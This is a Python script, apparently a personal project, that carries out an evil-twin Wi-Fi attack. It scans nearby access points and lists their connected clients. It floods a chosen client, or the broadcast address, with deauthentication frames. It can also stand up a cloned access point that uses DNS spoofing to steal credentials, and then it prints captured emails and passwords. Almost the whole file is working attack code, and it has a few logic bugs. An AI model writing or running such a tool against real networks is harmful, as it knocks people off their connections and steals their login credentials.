# Sergey Arenzon

import ifcfg
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
from wifi import Cell
from scapy.all import *
import yaml




#Shows available devices
def chooseDevice():
    devicesName = []
    for name, interface in ifcfg.interfaces().items():
        # print(interface['name'])         # First IPv4 found
        # print(interface['inet4'])        # List of ips
        # print(interface['inet6'])
        # print(interface['netmask'])
        # print(interface['broadcast'])
        devicesName.append(interface['device'])
    # print("Choose interface: ")
    count = 1
    for device in devicesName:
        print(str(count) + '.' + device)
        count += 1

    choice = int(input())
    attDevice = devicesName[choice - 1]
    return attDevice

#print the AP (SSID, MAC, Signal)
def printAP(interface):
    devices = []
    aps = (list(Cell.all(interface)))
    print('\033[91m' + "   SSID             ADDRESS              SIGNAL")
    count = 1
    for ap in aps:
        devices.append(ap)
        ap_ssid = ap.ssid[:15]
        if len(ap_ssid) < 15:
            ap_ssid += ' ' * (15 - len(ap_ssid))
        ap_address = ap.address #size 17
        print('\033[94m' + str(count) + '. ' + '\033[94m' + ap_ssid + "  " + ap_address+"    " + str(ap.signal))
        count += 1
    return devices

# Make device to monitor mode
def goMonitorMode(attDevice):
    os.system("sudo -S ifconfig " + attDevice + " down")
    os.system("sudo -S iwconfig " + attDevice + " mode monitor")
    os.system("sudo -S ifconfig " + attDevice + " up")
    print(attDevice + " is now in monitor mode!")

#Checking option permission
def checkFotRoot():
    if not os.geteuid() == 0:
        sys.exit("\nOnly root can run this script\n")

def apRescanHandler(interface):
    os.system("clear")
    print("===========\nScanned APs\n===========")
    devices = (list(printAP(interface)))
    attSsid = input("Choose your attack AP or \"R\" fore rescan: ")
    while attSsid == "R" or attSsid == "r":
        devices = (list(printAP(interface)))
        attSsid = input("Choose your attack AP or \"R\" fore rescan: ")
    return [devices[int(attSsid) - 1].ssid, devices[int(attSsid) - 1].address]

def startAP(ssid, interface):
    # Remove and create dnsmasq.conf
    os.remove("dnsmasq.conf")
    f = open("dnsmasq.conf", "a")

    # dhcp server provides ip to connected devices
    # dnsmasq runs dns server, and let us redirect to our web page

    # dnsmasq conf file:
    # interface=
    # dhcp-range=10.0.0.10, 10.0.0.100, 8h  (sets the IP range given to connected clients)
    # dhcp-option=3,10.0.0.1                (sets the gateway IP address, redirect the client to localhost server
    #                                       3=default gateway
    #                                       10.0.0.1=localhost IP server)
    # dhcp-option=6, 10.0.0.1               (dns server)
    #                                       6=set dns server
    # adress=/#/10.0.0.1                    (dns spoofing, every url will lead to localhost server)
    dnsmasq_conf = "interface=" + interface + "\ndhcp-range=10.0.0.10,10.0.0.100,8h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1"

    # Remove and create hostapd.conf
    os.remove("hostapd.conf")
    s = open("hostapd.conf", "a")

    # Hostapd created fake AP with specific name
    hostapd_conf = "interface=" + interface + "\nssid=" + ssid + "\nchannel=2\ndriver=nl80211"

    f.write(dnsmasq_conf)
    s.write(hostapd_conf)
    f.close()
    s.close()

    os.system("sudo bash fake-ap-start.sh")

def stopAttack():
    print("Stopping attack..")
    os.system("sudo bash fake-ap-stop.sh")
    f = open("/srv/http/passwords.txt")
    print("======================\nEmails and Passwords\n======================")
    print(f.read())


def deauth(brdmac, addr, interface):
    # print("\nChoose interface for deauth attack")
    # interface = chooseDevice()
    goMonitorMode(interface)
    print("Sending deauth packets")
    pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = addr, addr3 = addr) / Dot11Deauth()
    sendp(pkt, iface=interface, count=10000, inter=.2)

class AP:
    def __init__(self, ssid, bssid):
        self.ssid = ssid
        self.bssid = bssid
        self.connectedDevices = []

    def addDevice(self, device):
        self.connectedDevices.append(device)

class Device:
    def __init__(self, bssid, signal, vendor):
        self.bssid = bssid
        self.signal = signal
        self.vendor = vendor

def printDevices(ssid, interface):
    os.system('trackerjacker -i ' + interface + ' --map')

    stream = open("wifi_map.yaml", 'r')
    docs = yaml.load_all(stream)

    myAP = ssid

    for doc in docs:
        for name, v in doc.items():
            if myAP == name:
                # print(k, "->", v)
                apSsid = name
                other = v

    for o, v in other.items():
        apBssid = o
        devices = v["devices"]

    ap = AP(apSsid, apBssid)

    for bssid, other in devices.items():
        device = Device(bssid, other['signal'], other['vendor'])
        ap.addDevice(device)
    # print("\n\n\n ")
    print("===============================\nDevices connected to " + ssid + "\n===============================")
    print("\033[91mAP ssid: " + apSsid + "\nAP bssid: " + ap.bssid)
    print("Connected divices list:\n")
    print("\033[94mSSID                  SIGNAL    VENDOR")
    counter = 1


    for device in ap.connectedDevices:
        print(str(counter) + '. ' + device.bssid + "     " + str(device.signal) + "    " + device.vendor)
        counter += 1
    print(str(counter) + ". ff:ff:ff:ff:ff:ff (Broadcast attack)")

    # deviceNum = input("Choose for device for attack or \"R\" for rescan: ")
    # if(deviceNum == "r" or deviceNum == "R"):
    #     printDevices(ssid)

    os.system("rm wifi_map.yaml")
    print("\n\n\n")
    return ap.connectedDevices


def chooseAttDevice(ap_list):

    deviceNum = int(input("Choose for device for attack or \"R\" for rescan: ")) - 1

    if(deviceNum == "r" or deviceNum == "R"):
        printDevices(ssid)
    elif(deviceNum == len(ap_list)):
        return Device("ff:ff:ff:ff:ff:ff" , 0, "Broadcast")
    else:
        return ap_list[deviceNum]

if __name__ == "__main__":
    checkFotRoot()
    os.system("clear")
    print("Choose device for AP scan:")
    apDevice = chooseDevice()
    ap = apRescanHandler(apDevice)
    ssid = ap[0]
    addr = ap[1]
    # startAP(ssid, apDevice)

    os.system("clear")
    print("\nChoose interface for Mac scanning")
    interface = chooseDevice()
    goMonitorMode(interface)
    mac_list = printDevices(ssid, interface)

    x = chooseAttDevice(mac_list)
    print("Device being attacked: " + x.bssid + "  " + x.vendor)
    os.system("clear")
    deauth(x.bssid, addr, interface)
    os.system("clear")
    stopAttack()